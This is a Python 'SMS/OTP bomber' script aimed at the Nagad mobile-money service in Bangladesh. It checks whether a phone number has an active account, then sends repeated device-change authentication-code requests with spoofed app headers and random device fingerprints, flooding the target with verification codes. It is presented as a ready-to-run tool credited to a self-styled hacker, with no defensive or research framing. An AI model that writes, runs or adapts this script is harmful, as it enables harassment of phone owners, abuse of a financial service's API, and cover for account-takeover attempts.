
import requests
import json
import random
import sys

class bomber:
    def __init__(self, num, amt):
        self.num = num
        self.amt = amt
        self.uid = None
        self.sexsex = 0
        self.failed = 0
        self.start()

    def start(self):
        if self.check():
            self.bomb()
            self.respo()

    def sexy(self, url, method='GET', headers=None, payload=None):
        if headers is None:
            headers = {}

        if method == 'POST':
            response = requests.post(url, headers=headers, json=payload)
        else:
            response = requests.get(url, headers=headers, params=payload)

        return response

    def check(self):
        url = "https://app.mynagad.com:20002/api/user/check-user-status-for-log-in"
        params = {'msisdn': self.num}
        headers = self.cont_heda()

        response = self.sexy(url, 'GET', headers, params)
        status = response.json()

        if 'status' in status and status['status'] == "ACTIVE":
            self.uid = status['userId']
            return True
        else:
            self.output_error("NaGad account is not active.")
            return False

    def cont_heda(self):
        return {
            'User-Agent': 'okhttp/3.14.9',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'X-KM-UserId': 'None',
            'X-KM-User-AspId': '100012345612345',
            'X-KM-User-Agent': 'ANDROID/1152',
            'X-KM-DEVICE-FGP': ''.join(random.choices('0123456789ABCDEF', k=32)),
            'X-KM-Accept-language': 'bn',
            'X-KM-AppCode': '01'
        }

    def bomb(self):
        url = "https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange"
        payload = {"userId": self.uid}
        headers = self.cont_heda()
        headers['Content-Type'] = 'application/json; charset=UTF-8'

        for _ in range(self.amt):
            response = self.sexy(url, 'POST', headers, payload)
            self.counter(response.json())

    def counter(self, response):
        if 'executionStatus' in response and response['executionStatus']['statusType'] == "EXECUTED_SUCCESS":
            self.sexsex += 1
        else:
            self.failed += 1

    def respo(self):
        result = {
            "Status": f"success - {self.sexsex} & fail - {self.failed}",
            "num": self.num,
            "amt": self.amt,
            "Credit": "@SHOJIBHACKER"
        }
        print(json.dumps(result, indent=4, ensure_ascii=False))

    def output_error(self, message):
        error = {"error": message}
        print(json.dumps(error, indent=4, ensure_ascii=False))
        sys.exit()


if __name__ == '__main__':
    num = input("Enter Number: ")
    amt = input("Enter Limit: ")

    try:
        amt = int(amt)
        nagad = bomber(num, amt)
    except ValueError:
        print(json.dumps({"error": "Invalid 'amt' parameter."}, indent=4, ensure_ascii=False))
